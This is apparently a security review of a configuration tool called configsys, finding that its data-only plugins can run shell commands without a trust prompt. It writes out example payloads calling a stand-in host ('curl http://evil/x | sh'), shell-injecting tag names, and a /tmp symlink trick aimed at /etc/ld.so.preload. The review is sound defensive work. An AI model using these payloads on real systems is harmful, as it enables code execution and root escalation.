# configsys — security review (read-only, whole-tree sweep)

Scope: configsys's OWN attack surface, i.e. what an attacker can achieve BEYOND the
ordinary upstream-package supply-chain risk that any flatpak/apt user already accepts.
Read: CLAUDE.md, docs/plugins.md, runner.py, all execution-path drivers, plugins.py,
versions.py, layers.py, routes.py (facets), dotfiles/glue/shellguard, reportgen.

## Threat-model overview

Trust boundaries, from most-trusted to least:

1. **Core** (`configsys/`, `routes.hu`, `config.hu`) — the code and shipped data. Fully trusted.
2. **The user's own top config** (`~/.config/configsys/configsys.hu`) — trusted as the user
   (machine settings, pins, which plugins to pull). This is where "you chose to run this" lives.
3. **Primary plugin** — the user's blessed personal config-as-plugin. Elevated: may set machine
   settings and declare transitive plugins. Content-trusted like any plugin.
4. **Plugin DATA** (`*.hu` in a synced plugin: `os`/`drivers`/`components`/`profiles`/`facets`/
   `component-names`) — **syncs and loads with NO trust prompt** (docs/plugins.md §6: "Data-only
   plugins: sync freely, no prompt … just data can't do too much harm").
5. **Plugin CODE** (`code:` Python modules) — gated by per-content-hash trust + ABI + checksum.
   This gate is well-built.
6. **Upstream packages / release assets / git repos** — ordinary supply chain (accepted risk).

**The central finding of this review is that boundary #4 is drawn in the wrong place.** The trust
model treats "ships a `code:` Python module" as the code-execution line. But the DATA a plugin
ships is itself a program: a `via: script` / `via: source` / `via: glue`(`#!cs-eval`) binding, and
a `facets: { detect: … }` block, all carry **shell command strings that configsys executes** —
some at install time, some at mere inspection/startup time — with the user's privileges (root for
several drivers). A data-only plugin therefore achieves arbitrary code execution with **no trust
prompt at all**, which is exactly the blast radius the code-trust gate exists to contain. The
Python-code gate is real but sits next to an unlocked door.

### Themes

- **Data ≠ inert.** The whole point of the resolver is to turn declarative data into commands run
  through `runner.run` → `bash -c`. Any layer that can add a component/facet can run code. The
  trust gate only covers the Python `DRIVERS`/`SPLASHES` extension path, not the shell that the
  built-in `script`/`source`/`glue`/`facets`/`dotfiles` drivers execute from data fields.
- **Some of that code runs without an install** — `facets: detect:` (shell=True) runs on every
  resolve/startup; `script`/`source` version probes run during the read-only inspection sweep for
  any resolved unit. "I only ran `configsys inspect`" is not safe against a malicious data plugin.
- **No integrity check on anything downloaded.** Every download driver `curl -fSL`s a
  plugin-controlled URL and installs/executes the bytes with no sha256/signature. For
  `native-pkg-file` the installer runs as root.
- **A few concrete argv/path defects** compound the above: an unquoted `$VERSION` (an
  attacker-chosen upstream tag) interpolated into `source`/`script` build commands; a predictable
  world-writable `/tmp` path written by a root `curl -o` in `native-pkg-file`; and `dir_name()`
  path traversal (`..`) reachable through transitive plugin declarations.
- **The good parts:** command construction in the package-manager and download drivers is
  disciplined `shlex.quote`; the git transport blocks `ext::` and normalizes `file:`, fetches
  non-interactively; the code-plugin trust store fails closed and binds to a content hash; report
  scrubbing exists and never auto-sends.

---

## Findings

### [HIGH] code-exec / trust-bypass — data-only plugins run arbitrary shell via `script`/`source`/`glue`/`dotfiles` bindings

Files: `configsys/drivers/script.py:51,81,86,95,102` · `configsys/drivers/source.py:148-154,178`
· `configsys/drivers/glue.py:388-395` · `configsys/plugins.py:249-277` (data layers load with no
trust) · docs/plugins.md §6.

Threat model. Attacker publishes (or compromises the repo/tag of) a plugin the user adds — or one
declared **transitively** in a plugin the user already added (`plugins.effective_declared`,
`sync` fixpoint at plugins.py:1295-1320). The plugin ships **no `code:`**, so per docs/plugins.md
§6 and `layer_files` it syncs and its `components:` load **with no trust prompt and no ABI/trust
gate** (only `code:` is gated in `load_code`). The plugin defines, e.g.:

```
components: { pwn: { bindings: [ { via: script  install-cmd: "curl http://evil/x | sh" } ] } }
```

`Script.install` runs `self.runner.run(rc.fields['install-cmd'], capture=False)` →
`runner.run` → `bash -c '<attacker string>'` (runner.py:432) as the user. `via: source`'s `build:`
(source.py:148, joined with `&&` and run) and a `via: glue` snippet carrying `#!cs-eval <cmd>`
(glue.py:388 `_run_eval` → `runner.run(cmd)`) are equivalent. `via: dotfiles` can symlink
attacker-shipped content over a target the user then sources. What they achieve: full user-level
RCE the first time the user installs/activates that component; with a `sudo`-bearing command or a
system-scope binding, root.

Why it matters / why it's a defect (not accepted risk). Installing software inherently runs code —
BUT the trust model explicitly promises that a data-only plugin is safe to sync without approval
("just data can't do too much harm"). That promise is false: the data IS the code. The elaborate
per-content-hash trust that guards a plugin's Python `Driver` is trivially sidestepped by shipping
the same logic as a `script`/`source`/`glue` binding instead. The user is prompted to trust a
plugin that adds a package manager, but not one that adds `curl | sh`.

Mitigation.
- Treat a binding whose `via` is a **command-carrying built-in driver** (`script`, `source`, and
  a `glue` snippet containing `#!cs-eval`) exactly like `code:` for trust purposes: a plugin
  contributing any such binding is a "code plugin" and its data must be trusted per-content before
  those bindings are eligible to run. Cheapest correct fix; reuses the existing trust store.
- At minimum, surface these at sync/`plugin list`/`check` ("plugin X ships N shell-executing
  bindings — review before install") and require an explicit `plugin trust` before their
  install/activate ops execute, so the signal matches the blast radius.
- Long-term: sandbox/allow-list the command drivers, or make the whole plugin-data → shell path
  opt-in per plugin.

### [HIGH] code-exec at inspection/startup — `facets: { detect: … }` runs `shell=True` from any data plugin, with no install and no prompt

File: `configsys/routes.py:316-323` (`subprocess.run(str(cmd), shell=True, … timeout=15)`),
merged for roles `('repo','plugin','primary')` at `routes.py:233-234`, invoked automatically
whenever `facet_specs` is non-empty at `routes.py:372-374`.

Threat model. A **data-only** plugin (or transitive plugin) contributes a `facets:` block —
`merge_dict_section(..., 'facets', ('repo','plugin','primary'))` accepts it from an ordinary
`plugin` role, not just primary. Example:

```
facets: { pwn: { kind: version  detect: "curl http://evil/x | sh"  version-re: "(.*)" } }
```

`detect_facets` runs `subprocess.run(detect, shell=True)` for every declared facet during Context
resolution. This happens on **ordinary startup / `inspect` / `check` / resolve** — no install, no
component needs to be picked, no user confirmation. The command runs as the user.

Why it matters. This is strictly worse than the previous finding: it needs **zero user action
beyond having synced the plugin** (which itself needs no trust prompt), and `shell=True` on a raw
plugin-supplied string is textbook injection-by-design. It fires from the read path the user
thinks is safe.

Mitigation.
- Gate `facets:` from non-core layers behind the same code-trust as above; or restrict
  facet-`detect` to the primary plugin only (still needs trust) and never a transitive/`plugin`
  role.
- Replace `shell=True` with an argv list where possible, and treat the detect command as
  privileged data.
- Cache aside: `_FACET_CACHE` is keyed on specs+env; a changed plugin re-runs it. Fine, but note
  the command executes on the resolve path, so error handling must never surface its output
  unscrubbed (it currently swallows it — good).

### [HIGH] code-exec at inspection — `script`/`source` version probes run during the read-only sweep

Files: `configsys/drivers/script.py:51,61,64-70` (`get_version`/`get_latest` run `version-cmd`/
`latest-cmd`) · `configsys/installState.py:197-199` (`inspect_one` calls `get_installed` →
`get_version`).

Threat model. For any resolved unit whose driver is `script` (or `source`'s `latest`/marker read),
the startup/inspect sweep calls `get_version`, which runs the route's `version-cmd` via
`runner.run`. A data plugin whose component the user has picked (or that is pulled as a `requires:`
dependency) thus executes attacker shell **during inspection**, before any install is chosen.
Narrower reach than facets (the component must be in the resolved set), but same "read-only
operation executes attacker code" class.

Mitigation. Same gate as the first finding (command-driver bindings are code). Additionally,
consider that "inspect" is advertised as read-only and should not run arbitrary declared commands
from untrusted layers.

### [MED] local-privilege / arbitrary-root-write — `native-pkg-file` writes a predictable world-writable `/tmp` path as root

File: `configsys/drivers/native_pkg_file.py:126-129`
(`tmp = /tmp/configsys-{rc.comp}.{ext}` … `curl -fSL {url} -o $PKG` … run with `sudo=True`).

Threat model. The download+install runs under `sudo bash -c` (root). The temp filename is fully
predictable (`/tmp/configsys-<component>.deb`). A local unprivileged attacker pre-creates a symlink
`/tmp/configsys-<comp>.deb -> /etc/ld.so.preload` (or `/etc/cron.d/x`). `curl -o` follows the
symlink and writes the downloaded bytes **through it as root** — and the plugin/route also controls
the URL and hence the content — yielding arbitrary root file write → trivial root escalation. Even
without an attacker, a stale/misowned `/tmp` file collides.

Why it's a defect. The other download drivers stage under user-owned dirs or `mktemp -d`
(font.py:77, appImage `_extract_icon`); this one uses a fixed name in the sticky-but-world-writable
`/tmp`, and it's the one that runs as root and then hands the file to `apt-get/dnf/pacman install`.

Mitigation. Use `mktemp` in a root-owned dir (or a `mktemp -d` created before the sudo boundary),
or curl to a fixed path under `paths.state_dir`. Never write a predictable `/tmp` path as root.
Add `--no-clobber`/`-o` to a freshly-`mktemp`'d file and pass that.

### [MED] command injection — attacker-chosen upstream tag (`$VERSION`) is interpolated UNQUOTED into `source`/`script` build commands

Files: `configsys/drivers/source.py:86-88` (`_sub` does bare `str.replace('$VERSION', version)`),
used to build the shell string at `source.py:148,153,184`; `configsys/drivers/script.py:102`
(`cmd.replace('$VERSION', version)` for set-version).

Threat model. `version` comes from network discovery — a GitHub **tag name** (`versions.py`
atom-feed path) or a `url:` regex capture. Tag/branch names may legally contain shell
metacharacters. A malicious (or compromised) upstream repo publishes a tag like
`1.0$(curl http://evil|sh)` or `1.0;reboot`. During a `source` build/upgrade this is substituted
**unquoted** into the `build:`/`uninstall-cmd` string and run via `bash -c`. Result: command
injection where the attacker is the upstream repo — normally a repo can't inject beyond the code it
ships, so this crosses a boundary the user didn't sign up for.

Note the contrast: the tarball/appImage drivers `shlex.quote` the version everywhere it reaches the
shell (e.g. `verq` at tarball.py:81, marker printf), and download URLs are quoted; `source`'s build
substitution is the unguarded one because `build:` is treated as trusted author text — but
`$VERSION` inside it is not author text, it's network input.

Mitigation. Validate discovered version/tag strings against a strict charset
(`^[A-Za-z0-9._+~:-]+$`) before use, and/or export `$VERSION`/`$ARCH`/`$PREFIX`/`$SRC` as real
environment variables for the build shell instead of textual substitution (so shell quoting is
never the attacker's to break). Apply the same to `script` set-version.

### [MED] integrity — no checksum or signature on ANY downloaded asset; plugin fully controls the URL

Files: `configsys/driver.py:146-153` (`_fetch_and_extract`: `curl -fSL <url>` then extract) ·
`configsys/drivers/tarball.py:87-104` · `appImage.py:83` · `native_pkg_file.py:127` ·
`font.py:78-85` · `source.py:140-144`.

Threat model. A data plugin's `url:`/`version.asset` names an arbitrary URL; configsys downloads
and then extracts/`chmod +x`/`apt install`s it with **no sha256 or signature verification**. There
is a `sha256:` mechanism, but it applies only to the **plugin tree** (`plugin_identity`/
`checksum_ok`), never to release assets a binding downloads. So even a checksummed, trusted plugin
delivers unverified payloads from whatever host it names; and a MITM on a plaintext `url:` (nothing
forbids `http://`) substitutes bytes. For `native-pkg-file` the unverified bytes are installed as
root.

Why beyond ordinary flatpak risk. Flatpak/OStree verify content by hash/signature; here the plugin
author's URL is the sole authority and there's no pin. Combined with the no-trust data-plugin path,
this is the delivery mechanism for the HIGH findings.

Mitigation. Support (and, for `native-pkg-file`, encourage) a per-binding `sha256:` on the asset,
verified after download before extract/install. Reject non-`https` `url:` unless a checksum is
present. Consider GPG for native packages.

### [MED] path traversal — `dir_name()` does not reject `..`/empty; reachable via transitive plugin declarations

File: `configsys/plugins.py:222-228` (`dir_name`). Confirmed:
`dir_name('github:a/..') == '..'`, `dir_name('/') == ''`, `dir_name('github:a/.') == '.'`.
Consumers: `sync` clone target (`plugins.py:1311`, `plugins_dir / name`), `layer_files`
(`plugins.py:268`), `checksum_ok`, and `actions.plugin_remove` → **`shutil.rmtree(plugins_dir /
dir_name(...))`** (actions.py:793-795).

Threat model. Plugin declarations come not only from the user's top config but from **transitive
`plugins:` lists inside a synced plugin's manifest** (`effective_declared`/`sync` fixpoint), which
are attacker-controlled once any (unprompted, data-only) plugin is synced. A transitive decl with
`source: "x/.."` yields `plugins_dir / '..'` (= the state dir) and `source: "x//"`-style forms
yield empty → `plugins_dir` itself. `sync` then git-clones/fetches into that escaped path,
`layer_files`/`read_manifest` load `.hu` from it, and a `plugin remove` of such an entry
`rmtree`s the escaped directory (the state dir / a sibling). Impact ranges from writing/reading
outside the plugins sandbox to destructive removal of the state dir.

Mitigation. Sanitize in `dir_name`: reject or replace path separators and `.`/`..` segments; assert
the resolved `plugins_dir / name` is strictly contained in `plugins_dir` (`Path.resolve()` +
`is_relative_to`) before any clone/read/`rmtree`. Refuse empty names.

### [LOW] trust identity — trust + on-disk dir are keyed by `dir_name` basename, so different sources with the same basename collide

Files: `configsys/plugins.py:222` (dir_name), `:355-373` (trust keyed by dir name), docs/plugins.md
§6 ("keyed by the plugin's dir name").

Threat model. `github:alice/tools` and `github:mallory/tools` both map to dir `tools` and to the
same trust-store key. They share `plugins/tools/` (a later sync fetches over the earlier), and a
trust approval recorded for one basename matches the other's slot. Content-hash trust still forces
re-approval on differing content (so code exec is not silently inherited), but the collision is a
footgun for provenance and for the data-plugin path (which isn't hash-gated at all today).

Mitigation. Key the plugins dir and trust store by a hash/namespaced form of the full source, or
detect basename collisions across declared sources and error (`declared_conflicts` already does
name collisions for components — extend to plugin dirs).

### [LOW] secrets — dotfiles capture auto-exclude list is narrow and only auto-suggested on FIRST capture

Files: `configsys/drivers/dotfiles.py:62-63` (`_SECRET_GLOBS`), `:406-419` (suggested only when
`first`, and the user may still proceed).

Threat model. `capture` copies on-system config into the store (which, for a primary plugin, is a
git repo meant to travel). The secret-shaped auto-excludes cover `.env/id_*/*.pem/*.key/.ssh/…`
but miss common credential stores: `.netrc`, `.git-credentials`, `.npmrc`, `.pypirc`,
`.aws/credentials`, `.config/gh/hosts.yml`, `.kube/config`, `.gnupg/`, `.docker/config.json`,
`.config/rclone`. Auto-suggestion runs only on the first capture of a component; a later capture
into an existing manifest doesn't re-scan. A user capturing e.g. `~/.config` broadly could sync a
token into a shared plugin repo.

Mitigation. Expand `_SECRET_GLOBS` to the common credential set above; re-run `_suggest_secrets`
on every capture and warn (not just first); consider a hard refuse (not just exclude-suggest) for
the highest-risk names unless `--force`.

### [LOW] report — secret scrubbing is best-effort regex; novel/unlabeled tokens can leak into a filed issue

Files: `configsys/reportgen.py:25-34,105-121`; `configsys/app.py:2506-2518` (`gh issue create`).

Threat model. `configsys report` builds an issue body from command output/env and posts it (after
user approval) to a fixed public repo. Scrubbing masks known token *shapes* (GitHub/Slack/AWS),
label=value pairs, and the literal values of env vars whose *name* looks secret. A secret with an
unrecognized shape that appears in captured output without a secret-looking label (e.g. a bearer
value echoed by a failing installer, a private URL with an embedded credential not matching the
patterns) is not masked. The user reviews the body, but the redaction may lull.

Mitigation. Add high-entropy-string heuristics and mask query-string credentials in URLs; keep the
mandatory human review (good) and state clearly that scrubbing is best-effort.

### [NIT] trust TOCTOU — content hash and import read the tree twice

File: `configsys/plugins.py:1000` (`is_trusted(..., plugin_identity(pdir))`) then `:1006`
(`_import_module` re-reads the code file).

Threat model. Between hashing the tree and `exec_module`, a process able to write `plugins/<name>/`
could swap the code file. That writer is the same user configsys runs as, who already has full
control, so this is not a privilege boundary — noted for completeness.

Mitigation. Acceptable as-is; if hardened later, load bytes once and hash-then-exec the same
in-memory buffer.

### [NIT] os-release / manifest parsing — local, low-risk

Files: `configsys/osdetect.py:81-93` (`_parse_os_release`), `layers.py`/`troveio.py` (humon).
`/etc/os-release` is root-owned/local; humon parse failures are caught and degrade. No remote
attacker input reaches these in a way that isn't already covered above. No action.

---

## Accepted-risk context (stated once, not a defect)

- **Installing software runs code.** Every package-manager driver (apt/dnf/pacman/brew/…), and the
  user's own `script`/`source` bindings in their OWN config, run vendor code as designed. The user
  choosing to install is the consent. The findings above are specifically about code that runs
  **without that consent** (data-plugin path, inspection-time, facets) or with **weaker
  provenance than promised** (no asset checksums, plugin-supplied URLs).
- **Upstream package/asset/repo compromise** is the ordinary supply chain every flatpak/apt user
  faces; only called out where configsys removes a safeguard the ecosystem normally provides
  (no asset hash; `$VERSION` injection turning a tag name into code).

## What's done well

- Package-manager and download drivers construct argv with consistent `shlex.quote`; compound
  commands run under one shell deliberately (runner.py:429-432).
- Git transport blocks `ext::` (verified: "transport 'ext' not allowed"), normalizes `file:` to a
  clean path, fetches non-interactively (`GIT_TERMINAL_PROMPT=0`), and `--latest` only accepts
  stable semver tags.
- Code-plugin trust store fails closed (corrupt/missing = trust nothing), binds to a transport-
  independent content hash excluding `.git`/`__pycache__`, and re-prompts on any change.
- Report path never auto-sends and scrubs before display.
- Atomic staging in tarball/appImage installs avoids leaving a half-written binary.
